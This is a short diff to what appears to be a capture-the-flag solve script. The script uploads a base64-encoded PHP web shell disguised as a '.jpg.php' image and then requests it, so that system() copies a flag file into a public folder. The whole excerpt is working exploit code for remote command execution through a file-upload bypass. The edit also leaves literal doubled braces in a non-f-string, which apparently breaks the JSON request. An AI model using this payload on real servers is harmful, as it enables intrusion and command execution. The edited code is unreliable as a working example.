@@ -212,14 +212,14 @@ fn = hexlify(os.urandom(8)).decode()
 payload = f"<?php system('cp /var/www/flag.txt /var/www/html/uploads/{fn}.txt');?>"
 payload = b64encode(payload.encode())
 
-data = f"""
+data = """
 {{
-   "name":"{fn}.jpg.php",
+   "name":"%s.jpg.php",
    "id":"ODIzODI5MTNiYmYw",
    "mime":"application/x-php",
-   "body":"data:application/x-php;base64,{payload.decode()}"
+   "body":"data:application/x-php;base64,%s"
 }}
-"""
+""" % (fn, payload.decode())
 
 r = s.post(url+ '/upload',data=data)
 r = s.get(url + f'/uploads/{fn}.jpg.php')
